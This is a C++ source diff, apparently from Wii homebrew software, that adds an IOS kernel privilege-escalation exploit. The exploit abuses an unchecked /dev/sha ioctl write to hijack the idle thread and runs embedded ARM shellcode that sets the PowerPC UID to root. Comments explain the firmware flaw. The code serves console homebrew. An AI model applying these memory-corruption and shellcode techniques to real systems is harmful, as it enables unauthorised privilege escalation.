@@ -1,5 +1,8 @@
+// Exploit based on https://github.com/TheLordScruffy/saoirse/blob/master/channel/Main/IOSBoot.cpp
+
 #include "IOS.hh"
 
+#include "Clock.hh"
 #include "DCache.hh"
 
 #include <cstring>
@@ -20,6 +23,174 @@ enum {
     IY1 = 1 << 4,
     IY2 = 1 << 5,
 };
+
+void Init() {
+#ifdef SP_CHANNEL
+    irqmask = 1 << 30;
+    ppcctrl = X2;
+#else
+    //while ((ppcctrl & Y2) != Y2); HACK for Dolphin
+    ppcctrl = Y2;
+    ppcctrl = Y1;
+#endif
+}
+
+enum class SC {
+    IOS_SetUid = 0x2B,
+    IOS_InvalidateDCache = 0x3F,
+    IOS_FlushDCache = 0x40,
+};
+
+constexpr u32 syscall(SC id) {
+    return 0xE6000010 | static_cast<u8>(id) << 5;
+}
+
+u32 armCode[] = {
+    /* 0x00 */ 0xEA000000, // b       0x8
+    /* 0x04 */ 0x00000000, // MESSAGE_VALUE
+    // Set PPC UID to root
+    /* 0x08 */ 0xE3A0000F, // mov     r0, #15
+    /* 0x0C */ 0xE3A01000, // mov     r1, #0
+    /* 0x10 */ syscall(SC::IOS_SetUid),
+    // Send response to PPC
+    /* 0x14 */ 0xE24F0018, // adr     r0, MESSAGE_VALUE
+    /* 0x18 */ 0xE3A01001, // mov     r1, #1
+    /* 0x1C */ 0xE5801000, // str     r1, [r0]
+    // Flush the response to main memory
+    /* 0x20 */ 0xE3A01004, // mov     r1, #4
+    /* 0x24 */ syscall(SC::IOS_FlushDCache),
+    // Wait for response back from PPC
+    // loop_start:
+    /* 0x28 */ 0xE24F002C, // adr     r0, MESSAGE_VALUE
+    /* 0x2C */ 0xE5902000, // ldr     r2, [r0]
+    /* 0x30 */ 0xE3520002, // cmp     r2, #2
+    /* 0x34 */ 0x0A000001, // beq     loop_break
+    /* 0x38 */ syscall(SC::IOS_InvalidateDCache),
+    /* 0x3C */ 0xEAFFFFF9, // b       loop_start
+    // loop_break:
+    // Reset PPC UID back to 15
+    /* 0x40 */ 0xE3A0000F, // mov     r0, #15
+    /* 0x44 */ 0xE3A0100F, // mov     r1, #15
+    /* 0x48 */ syscall(SC::IOS_SetUid),
+    // Send response to PPC
+    /* 0x4C */ 0xE24F0050, // adr     r0, MESSAGE_VALUE
+    /* 0x50 */ 0xE3A01003, // mov     r1, #3
+    /* 0x54 */ 0xE5801000, // str     r1, [r0]
+    // Flush the response to main memory
+    /* 0x58 */ 0xE3A01004, // mov     r1, #4
+    /* 0x5C */ syscall(SC::IOS_FlushDCache),
+    /* 0x60 */ 0xE12FFF1E, // bx      lr
+};
+
+static bool IsDolphin() {
+    // Modern versions
+    alignas(0x20) const char *dolphinPath = "/dev/dolphin";
+    Resource dolphin(dolphinPath, Mode::None);
+    if (dolphin.ok()) {
+        return true;
+    }
+
+    // Old versions
+    alignas(0x20) const char *shaPath = "/dev/sha";
+    Resource sha(shaPath, Mode::None);
+    if (!sha.ok()) {
+        return true;
+    }
+
+    return false;
+}
+
+static void SafeFlush(const void *start, size_t size) {
+    // The IPC function flushes the cache here on PPC, and then IOS invalidates its own cache.
+    // Note: IOS doesn't check for the invalid fd before they do what we want.
+    File file(-1);
+    file.write(start, size);
+}
+
+template <typename T>
+static void SafeFlush(const T *val) {
+    SafeFlush(val, sizeof(T));
+}
+
+static u32 ReadMessage() {
+    u32 address = reinterpret_cast<u32>(&armCode[1]);
+    u32 message;
+    asm volatile("lwz %0, 0x0 (%1); sync" : "=r"(message) : "b"(0xC0000000 | address));
+    return message;
+}
+
+static void WriteMessage(u32 message) {
+    u32 address = reinterpret_cast<u32>(&armCode[1]);
+    asm volatile("stw %0, 0x0 (%1); eieio" : : "r"(message), "b"(0xC0000000 | address));
+}
+
+// Performs an IOS exploit and branches to the entrypoint in system mode.
+//
+// Exploit summary:
+// - IOS does not check validation of vectors with length 0.
+// - All memory regions mapped as readable are executable (ARMv5 has no 'no execute' flag).
+// - NULL/0 points to the beginning of MEM1.
+// - The /dev/sha resource manager, part of IOSC, runs in system mode.
+// - It's obvious basically none of the code was audited at all.
+//
+// IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the length at all. Two of
+// the 32-bit values it initializes are zero.
+//
+// Common approach: Point the context vector to the LR on the stack and then take control after
+// return.
+// A much more stable approach taken here: Overwrite the PC of the idle thread, which should always
+// have its context start at 0xFFFE0000 in memory (across IOS versions).
+bool EscalatePrivileges() {
+    // Dolphin defaults to UID 0 for standalone binaries
+    if (IsDolphin()) {
+        return true;
+    }
+
+    // To make sure it's not in the PPC cache
+    SafeFlush(armCode);
+
+    alignas(0x20) const char *shaPath = "/dev/sha";
+    Resource sha(shaPath, Mode::None);
+    if (!sha.ok()) {
+        return false;
+    }
+
+    u32 *mem1 = reinterpret_cast<u32 *>(0x80000000);
+    mem1[0] = 0x4903468D; // ldr r1, =0x10100000; mov sp, r1;
+    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
+    // Overwrite reserved handler to loop infinitely
+    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
+    mem1[3] = 0x47080000; // bx r1
+    mem1[4] = 0x10100000; // temporary stack
+    mem1[5] = VirtualToPhysical(&armCode);
+    mem1[6] = 0xFFFF0014; // reserved handler
+
+    alignas(0x20) Resource::IoctlvPair pairs[4];
+    pairs[0].data = nullptr;
+    pairs[0].size = 0;
+    pairs[1].data = reinterpret_cast<void *>(0xFFFE0028);
+    pairs[1].size = 0;
+    // Unused vector utilized for cache safety
+    pairs[2].data = reinterpret_cast<void *>(0x80000000);
+    pairs[2].size = 0x20;
+
+    // IOS_Ioctlv should never return an error if the exploit succeeded
+    if (sha.ioctlv(0, 1, 2, pairs) < 0) {
+        return false;
+    }
+
+    while (ReadMessage() != 1) {
+        Clock::WaitMilliseconds(1);
+    }
+    return true;
+}
+
+void DeescalatePrivileges() {
+    WriteMessage(2);
+    while (ReadMessage() != 3) {
+        Clock::WaitMilliseconds(1);
+    }
+}
 
 enum class Command : u32 {
     Open = 1,
@@ -68,17 +239,6 @@ static_assert(sizeof(Request) == 0x40);
 
 alignas(0x20) static Request request;
 
-void Init() {
-#ifdef SP_CHANNEL
-    irqmask = 1 << 30;
-    ppcctrl = X2;
-#else
-    //while ((ppcctrl & Y2) != Y2); HACK for Dolphin
-    ppcctrl = Y2;
-    ppcctrl = Y1;
-#endif
-}
-
 static void Sync() {
     DCache::Flush(&request);
 
@@ -99,6 +259,8 @@ static void Sync() {
 
     DCache::Invalidate(&request);
 }
+
+Resource::Resource(s32 fd) : m_fd(fd) {}
 
 Resource::Resource(const char *path, Mode mode) {
     open(path, mode);
@@ -187,6 +349,8 @@ s32 Resource::ioctlv(u32 ioctlv, u32 inputCount, u32 outputCount, IoctlvPair *pa
 bool Resource::ok() const {
     return m_fd >= 0;
 }
+
+File::File(s32 fd) : Resource(fd) {}
 
 File::File(const char *path, Mode mode) : Resource(path, mode) {}
 
